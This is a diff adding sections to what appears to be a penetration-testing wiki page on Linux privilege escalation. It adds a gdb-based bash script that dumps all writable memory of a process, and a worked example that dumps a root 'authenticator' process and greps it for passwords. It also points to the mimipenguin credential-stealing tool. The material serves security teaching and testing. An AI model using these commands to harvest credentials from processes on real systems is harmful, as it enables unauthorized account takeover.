@@ -227,6 +227,21 @@ gdb -p <FTP_PROCESS_PID>
 strings /tmp/mem_ftp #User and password
 ```
 
+#### GDB Script
+
+{% code title="dump-memory.sh" %}
+```bash
+#!/bin/bash
+#./dump-memory.sh <PID>
+grep rw-p /proc/$1/maps \
+    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
+    | while read start stop; do \
+    gdb --batch --pid $1 -ex \
+    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
+done
+```
+{% endcode %}
+
 #### /proc/$pid/maps &  /proc/$pid/mem
 
 For a given process ID, **maps shows how memory is mapped within that processes'** virtual address space; it also shows the **permissions of each mapped region**. The **mem** pseudo file **exposes the processes memory itself**. From the **maps** file we know which **memory regions are readable** and their offsets. We use this information to **seek into the mem file and dump all readable regions** to a file.
@@ -261,6 +276,24 @@ To dump a process memory you could use:
 * Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) \(root is required\)
 
 ### Credentials from Process Memory
+
+#### Manual example
+
+If you find that the authenticator process is running:
+
+```bash
+ps -ef | grep "authenticator"
+root      2027  2025  0 11:46 ?        00:00:00 authenticator
+```
+
+You can dump the process \(see before sections to find different ways to dump the memory of a process\) and search for credentials inside the memory:
+
+```bash
+./dump-memory.sh 2027
+strings *.dump | grep -i password
+```
+
+#### mimipenguin
 
 The tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) will **steal clear text credentials from memory** and from some **well known files**. It requires root privileges to work properly.
 
